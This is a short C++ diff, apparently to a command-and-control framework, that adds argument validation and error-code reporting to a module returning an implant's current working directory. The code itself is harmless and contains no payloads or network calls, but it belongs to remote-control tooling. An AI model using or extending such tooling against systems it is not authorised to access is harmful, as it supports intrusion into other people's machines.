@@ -59,6 +59,11 @@ std::string PrintWorkingDirectory::getInfo()
 int PrintWorkingDirectory::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    if (splitedCmd.size() != 1)
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
     c2Message.set_instruction(splitedCmd[0]);
     c2Message.set_cmd("");
 #endif
@@ -69,20 +74,30 @@ int PrintWorkingDirectory::init(std::vector<std::string> &splitedCmd, C2Message 
 
 int PrintWorkingDirectory::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-    std::string outCmd = printWorkingDirectory();
+    std::string outCmd;
+    const bool read = printWorkingDirectory(outCmd);
 
     c2RetMessage.set_instruction(c2RetMessage.instruction());
     c2RetMessage.set_cmd("");
     c2RetMessage.set_returnvalue(outCmd);
+    c2RetMessage.set_errorCode(read ? 0 : 1);
 
     return 0;
 }
 
 
-std::string PrintWorkingDirectory::printWorkingDirectory()
+int PrintWorkingDirectory::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
 {
-    std::string result;
-    result = filesystem::current_path().string();
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    if (c2RetMessage.errorCode() == 1)
+        errorMsg = "Failed: Could not read working directory";
+#endif
+    return 0;
+}
 
-    return result;
+bool PrintWorkingDirectory::printWorkingDirectory(std::string& result)
+{
+    std::error_code ec;
+    result = filesystem::current_path(ec).string();
+    return !ec;
 }
